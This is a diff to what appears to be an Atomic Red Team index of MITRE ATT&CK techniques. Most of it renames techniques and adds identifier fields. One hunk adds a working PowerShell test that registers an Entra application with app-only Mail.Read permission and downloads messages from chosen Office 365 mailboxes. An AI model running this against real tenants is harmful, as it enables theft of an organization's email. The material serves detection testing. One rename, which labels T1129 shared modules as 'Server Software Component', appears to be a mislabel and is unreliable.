@@ -1264,7 +1264,7 @@ defense-evasion:
   T1542.001:
     technique:
       modified: '2023-03-30T21:01:49.493Z'
-      name: System Firmware
+      name: 'Pre-OS Boot: System Firmware'
       description: |-
         Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)
 
@@ -1339,6 +1339,7 @@ defense-evasion:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
+      identifier: T1542.001
     atomic_tests: []
   T1574.011:
     technique:
@@ -7293,7 +7294,7 @@ defense-evasion:
   T1562.010:
     technique:
       modified: '2023-10-03T16:40:15.445Z'
-      name: Downgrade Attack
+      name: 'Impair Defenses: Downgrade Attack'
       description: "Adversaries may downgrade or use a version of system features
         that may be outdated, vulnerable, and/or does not support updated security
         controls. Downgrade attacks typically take advantage of a system’s backward
@@ -7379,6 +7380,7 @@ defense-evasion:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.2.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1562.010
     atomic_tests: []
   T1497:
     technique:
@@ -7920,7 +7922,7 @@ defense-evasion:
   T1562.003:
     technique:
       modified: '2023-03-30T21:01:47.940Z'
-      name: 'Impair Defenses: HISTCONTROL'
+      name: 'Impair Defenses: Impair Command History Logging'
       description: "Adversaries may impair command history logging to hide commands
         they run on a compromised system. Various command interpreters keep track
         of the commands users type in their terminal so that users can retrace what
@@ -12545,7 +12547,7 @@ defense-evasion:
         Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)
       modified: '2022-08-23T18:32:46.899Z'
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Dynamic API Resolution
+      name: 'Obfuscated Files or Information: Dynamic API Resolution'
       x_mitre_detection: ''
       kill_chain_phases:
       - phase_name: defense-evasion
@@ -12557,6 +12559,7 @@ defense-evasion:
       - 'Process: OS API Execution'
       x_mitre_attack_spec_version: 2.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1027.007
     atomic_tests: []
   T1055.015:
     technique:
@@ -23041,7 +23044,7 @@ execution:
   T1129:
     technique:
       modified: '2023-10-12T21:17:14.868Z'
-      name: Shared Modules
+      name: Server Software Component
       description: |-
         Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).
 
@@ -23112,6 +23115,7 @@ execution:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.2.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1129
     atomic_tests: []
   T1059.007:
     technique:
@@ -24014,6 +24018,7 @@ execution:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1059
     atomic_tests: []
   T1609:
     technique:
@@ -26191,7 +26196,7 @@ persistence:
   T1542.001:
     technique:
       modified: '2023-03-30T21:01:49.493Z'
-      name: System Firmware
+      name: 'Pre-OS Boot: System Firmware'
       description: |-
         Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)
 
@@ -26266,6 +26271,7 @@ persistence:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
+      identifier: T1542.001
     atomic_tests: []
   T1574.011:
     technique:
@@ -29540,7 +29546,7 @@ persistence:
         description: Soutcast. (2018, September 14). Outlook Today Homepage Persistence.
           Retrieved February 5, 2019.
       modified: '2021-08-16T21:27:10.873Z'
-      name: Office Template Macros
+      name: 'Office Application Startup: Office Template Macros.'
       description: "Adversaries may abuse Microsoft Office templates to obtain persistence
         on a compromised system. Microsoft Office contains templates that are part
         of common Office applications and are used to customize styles. The base templates
@@ -29592,6 +29598,7 @@ persistence:
       x_mitre_permissions_required:
       - User
       - Administrator
+      identifier: T1137.001
     atomic_tests: []
   T1546.009:
     technique:
@@ -34850,6 +34857,7 @@ command-and-control:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1071
     atomic_tests: []
   T1219:
     technique:
@@ -36460,7 +36468,7 @@ command-and-control:
           & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
         source_name: University of Birmingham C2
       modified: '2020-03-15T00:37:58.963Z'
-      name: Steganography
+      name: Data Obfuscation via Steganography
       description: 'Adversaries may use steganographic techniques to hide command
         and control traffic to make detection efforts more difficult. Steganographic
         techniques can be used to hide data in digital messages that are transferred
@@ -36482,6 +36490,7 @@ command-and-control:
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
       x_mitre_data_sources:
       - 'Network Traffic: Network Traffic Content'
+      identifier: T1001.002
     atomic_tests: []
   T1008:
     technique:
@@ -38646,7 +38655,7 @@ collection:
   T1114.002:
     technique:
       modified: '2023-05-31T12:34:03.420Z'
-      name: Remote Email Collection
+      name: 'Email Collection: Remote Email Collection'
       description: Adversaries may target an Exchange server, Office 365, or Google
         Workspace to collect sensitive information. Adversaries may leverage a user's
         credentials and interact directly with the Exchange server to acquire information
@@ -38687,7 +38696,98 @@ collection:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-    atomic_tests: []
+      identifier: T1114.002
+    atomic_tests:
+    - name: Office365 - Remote Mail Collected
+      auto_generated_guid: 36657d95-d9d6-4fbf-8a31-f4085607bafd
+      description: "Create and register an entra application that downloads emails
+        from a tenant's Office 365 mailboxes using the Microsoft Graph API app-only
+        access. This can be used by an adversary to collect an organization's sensitive
+        information. \n"
+      supported_platforms:
+      - office-365
+      input_arguments:
+        username:
+          description: Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All
+            and Application.ReadWrite.All Scope (eg, Global Administrator Role) and
+            sign-in method is password
+          type: string
+          default: 
+        password:
+          description: Entra user password
+          type: string
+          default: 
+        1st_target_mailbox:
+          description: office-365 target_email_address
+          type: string
+          default: 
+        2nd_target_mailbox:
+          description: office-365 target_email_address
+          type: string
+          default: 
+        3rd_target_mailbox:
+          description: office-365 target_email_address
+          type: string
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Microsoft Graph PowerShell SDK must be installed.
+
+          '
+        prereq_command: |
+          $RequiredModule = Get-InstalledModule Microsoft.Graph
+          if (-not $RequiredModule) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module Microsoft.Graph -Scope CurrentUser
+
+          '
+      - description: 'Az.Accounts module must be installed.
+
+          '
+        prereq_command: |
+          $RequiredModule2 = Get-InstalledModule Az.Accounts
+          if (-not $RequiredModule2) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module Az.Accounts -Scope CurrentUser
+
+          '
+      executor:
+        command: "$ss = ConvertTo-SecureString \"#{password}\" -AsPlainText -Force\n$cred
+          = New-Object PSCredential -ArgumentList '#{username}', $ss\n$param = @{\n
+          \   Credential = $cred\n    Force      = $true\n}\n$null = Connect-AzAccount
+          @param\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction
+          Stop).token\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell
+          Application\" -CertStoreLocation \"Cert:\\CurrentUser\\My\" -KeyExportPolicy
+          Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm
+          SHA256\n$reqResourceAccess = ( @{ \"resourceAccess\" = (@{\"id\"= \"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\";
+          \"type\"= \"Scope\"}, @{ \"id\"= \"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\";
+          \"type\"= \"Scope\"}, @{\"id\"= \"37f7f235-527c-4136-accd-4a02d197296e\";
+          \"type\"= \"Scope\"}, @{\"id\"= \"14dad69e-099b-42c9-810b-d002981feec1\";
+          \"type\"= \"Scope\"}, @{ \"id\"= \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\";
+          \"type\"= \"Scope\"}, @{ \"id\"= \"810c84a8-4a9e-49e6-bf7d-12d183f40d01\";
+          \"type\"= \"Role\"}); \"resourceAppId\" = \"00000003-0000-0000-c000-000000000000\"
+          })\nconnect-mggraph -AccessToken $token\n$context = Get-MgContext       \n$users
+          = get-MgUser\n$app = New-MgApplication -DisplayName \"T1114.002 Atomic Test
+          #1 - Office365 - Remote Email Collection\" -RequiredResourceAccess $reqResourceAccess
+          -Web @{ RedirectUris=\"http://localhost\"; } -KeyCredentials @(@{ Type=\"AsymmetricX509Cert\";
+          Usage=\"Verify\"; Key=$cert.RawData })\nNew-MgServicePrincipal -AppId $app.appId
+          -AdditionalProperties @{} | Out-Null\n$resourceSPN = Get-MgServicePrincipal
+          -Filter \"AppId eq '$($app.AppId)'\"\n$graphApiApp = Get-MgServicePrincipal
+          -Filter \"DisplayName eq 'Microsoft Graph'\"\n$mailRole = $graphApiApp.AppRoles|Where-Object
+          Value -Eq \"Mail.Read\"\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId
+          $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id
+          -AppRoleId $mailRole.Id\n$mailbox1 = \"#{1st_target_mailbox}\"\n$mailbox2
+          = \"#{2nd_target_mailbox}\"\n$mailbox3 = \"#{3rd_target_mailbox}\"\n[System.Collections.ArrayList]$selectUsers
+          = @()\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail
+          -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph
+          -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach
+          ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\"
+          ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n"
+        cleanup_command: |
+          connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
+          Remove-MgApplication $app.AppId
+          Remove-Item -Path Cert:\CurrentUser\My\$($cert.thumbprint) -DeleteKey
+          Disconnect-MgGraph
+        name: powershell
+        elevation_required: false
   T1056:
     technique:
       modified: '2023-03-30T21:01:41.752Z'
@@ -39283,7 +39383,7 @@ lateral-movement:
   T1021.004:
     technique:
       modified: '2023-08-11T20:24:03.069Z'
-      name: SSH
+      name: 'Remote Services: SSH'
       description: |-
         Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.
 
@@ -39329,6 +39429,7 @@ lateral-movement:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_attack_spec_version: 3.1.0
       x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      identifier: T1021.004
     atomic_tests: []
   T1091:
     technique:
